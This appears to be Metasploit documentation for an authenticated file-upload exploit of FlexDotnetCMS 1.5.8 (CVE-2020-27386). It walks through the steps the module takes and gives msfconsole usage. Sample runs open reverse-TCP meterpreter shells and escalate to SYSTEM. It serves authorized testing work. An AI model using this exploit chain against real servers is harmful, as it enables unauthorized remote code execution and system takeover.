## Vulnerable Application
This module exploits an arbitrary file upload vulnerability (CVE-2020-27386) in FlexDotnetCMS v1.5.8 and prior
in order to execute arbitrary commands with elevated privileges.

The module first tries to obtain various tokens required for authentication from `/login`.
Next, the module tries to authenticate via an HTTP POST request to the same destination followed by an HTTP GET request to `/Admin`.
If authentication is successful, the module uploads a TXT file containing a random string via an HTTP POST request to
`/Scripts/tinyfilemanager.net/dialog.aspx`.
The module then loads the uploaded TXT file in the file editor in order to obtain tokens necessary for renaming the TXT file.
It then tries to rename the TXT file to an ASP file via an HTTP POST request to `/Admin/Views/PageHandlers/FileEditor/Default.aspx`.
If this succeeds, the target is vulnerable and the ASP file is generated as a copy of the TXT file, which remains on the server.
Next, the module sends another request to the file editor to rename the TXT file to an ASP file, this time adding the payload.
The module will execute the payload via a simple HTTP GET request to `/media/uploads/asp_payload`.
Finally, the module will try to delete both the uploaded TXT file and the ASP copy from the target.

Valid credentials for a FlexDotnetCMS user with permissions to use the FileManager are required.
This attack will normally result in remote code execution with administrator privileges, because the attacker will inherit the privileges
of the IIS/IIS Express process, which must run with elevated privileges if configured to allow remote connections.
This module has been successfully tested against FlexDotnetCMS v1.5.8 running on Windows Server 2012.

Vulnerable software for testing is available on GitHub [here](https://github.com/MacdonaldRobinson/FlexDotnetCMS/releases).
Detailed installation instructions are available
[here](https://github.com/MacdonaldRobinson/FlexDotnetCMS/raw/master/WebApplication/Admin/media/docs/FlexDotnetCMSGuide.docx).
As the instructions mention, FlexDotnetCMS requires the following dependencies:
- .NET Framework 4.5.2
- Visual Studio 2015 (Free Community Edition works)
- MS SQL Server (Express) 2012 +
- IIS (Express) 8 +

## Verification Steps
1. Install the module as usual
2. Start msfconsole
3. Do: `use exploit/multi/http/FlexDotnetCMS_upload_exec`
4. Do: `set RHOSTS [IP]`
5. Do: `set USERNAME [username for the FlexDotnetCMS account]`
6. Do: `set PASSWORD [password for the FlexDotnetCMS account]`
7. Do: `set target [target]`
8. Do: `set payload [payload]`
9. Do: `set LHOST [IP]`
10. Do: `exploit`

## Options
### PASSWORD
The password for the FlexDotnetCMS account to authenticate with.
### TARGETURI
The base path to FlexDotnetCMS. The default value is `/`.
### USERNAME
The username for the FlexDotnetCMS account to authenticate with. The default value is `admin`.

## Targets
```
Id  Name
--  ----
0   Windows (x86)
1   Windows (x64)
```

## Scenarios
### FlexDotnetCMS v1.5.8 running on Windows Server 2012 - Windows x86 target
```
msf6 exploit(windows/http/flexdotnetcms_upload_exec) > show options

Module options (exploit/windows/http/flexdotnetcms_upload_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   Password1        yes       Password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.1.230    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      1113             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to FlexDotnetCMS
   USERNAME   admin            yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.128    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows (x86)


msf6 exploit(windows/http/flexdotnetcms_upload_exec) > run

[*] Started reverse TCP handler on 192.168.1.128:4444 
[*] Executing automatic check (disable AutoCheck to override)
[+] Successfully authenticated to FlexDotnetCMS
[*] FlexDotnetCMS is installed on the target at C:/Users/Administrator/Desktop/FlexDotnetCMS-1.5.8/
[*] Uploaded test file wxoI7s6knq.txt. Attempting to rename the file to wxoI7s6knq.asp...
[+] Successfully renamed test file wxoI7s6knq.txt to wxoI7s6knq.asp (this is a copy of wxoI7s6knq.txt, which remains on the server)
[+] The target is vulnerable. Target is FlexDotnetCMS v1.5.8 or lower.
[*] Renaming wxoI7s6knq.txt to wxoI7s6knq.asp again, this time adding the payload
[+] Successfully added the ASP payload to wxoI7s6knq.asp
[*] Executing the payload...
[*] Sending stage (175174 bytes) to 192.168.1.230
[*] Meterpreter session 9 opened (192.168.1.128:4444 -> 192.168.1.230:62058) at 2020-11-02 11:10:41 -0500
[+] Successfully deleted wxoI7s6knq.txt
[+] Successfully deleted wxoI7s6knq.asp

meterpreter > getuid
Server username: WIN-S623VF4MJDR\Administrator
meterpreter > getsystem 
ge...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
tmeterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```
### FlexDotnetCMS v1.5.8 running on Windows Server 2012 - Windows x64 target
```
msf6 exploit(windows/http/flexdotnetcms_upload_exec) > run

[*] Started reverse TCP handler on 192.168.1.128:4444 
[*] Executing automatic check (disable AutoCheck to override)
[+] Successfully authenticated to FlexDotnetCMS
[*] FlexDotnetCMS is installed on the target at C:/Users/Administrator/Desktop/FlexDotnetCMS-1.5.8/
[*] Uploaded test file XLz3OTusi.txt. Attempting to rename the file to XLz3OTusi.asp...
[+] Successfully renamed test file XLz3OTusi.txt to XLz3OTusi.asp (this is a copy of XLz3OTusi.txt, which remains on the server)
[+] The target is vulnerable. Target is FlexDotnetCMS v1.5.8 or lower.
[*] Renaming XLz3OTusi.txt to XLz3OTusi.asp again, this time adding the payload
[+] Successfully added the ASP payload to XLz3OTusi.asp
[*] Executing the payload...
[*] Sending stage (200262 bytes) to 192.168.1.230
[*] Meterpreter session 10 opened (192.168.1.128:4444 -> 192.168.1.230:62059) at 2020-11-02 11:10:55 -0500
[+] Successfully deleted XLz3OTusi.txt
[+] Successfully deleted XLz3OTusi.asp

meterpreter > getuid
Server username: WIN-S623VF4MJDR\Administrator
meterpreter >
```
